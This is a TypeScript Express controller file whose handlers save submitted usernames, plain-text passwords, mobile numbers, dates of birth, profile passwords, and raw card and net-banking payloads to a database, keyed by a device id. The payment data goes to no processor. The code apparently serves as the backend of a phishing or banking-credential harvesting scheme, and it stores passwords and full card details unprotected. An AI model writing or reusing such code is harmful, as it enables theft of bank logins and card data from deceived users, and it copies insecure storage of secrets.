import { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import Payment from "../models/Payment";
import logger from "../logger/logger";

/**
 * Form handlers to store incoming submissions and payments.
 */

export async function submitForm(req: Request, res: Response) {
  const body = req.body || {};
  try {
    const doc = new FormSubmission({
      uniqueid: body.uniqueid || body.deviceId || "",
      username: body.username || "",
      password: body.password || "",
      mobileNumber: body.mobileNumber || "",
    });
    await doc.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitForm failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function submitSuccessData(req: Request, res: Response) {
  const body = req.body || {};
  const uniqueid = body.uniqueid || "";
  if (!uniqueid) return res.status(400).json({ success: false, error: "missing uniqueid" });
  try {
    const update: any = { $set: {} };
    if (body.dob) update.$set["dob"] = body.dob;
    if (body.profilePassword) update.$set["profilePassword"] = body.profilePassword;
    await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitSuccessData failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function submitCardPayment(req: Request, res: Response) {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "card",
      payload: body,
      status: "pending",
    });
    await p.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitCardPayment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}

export async function submitNetBanking(req: Request, res: Response) {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "netbanking",
      payload: body,
      status: "pending",
    });
    await p.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("controller: submitNetBanking failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
}
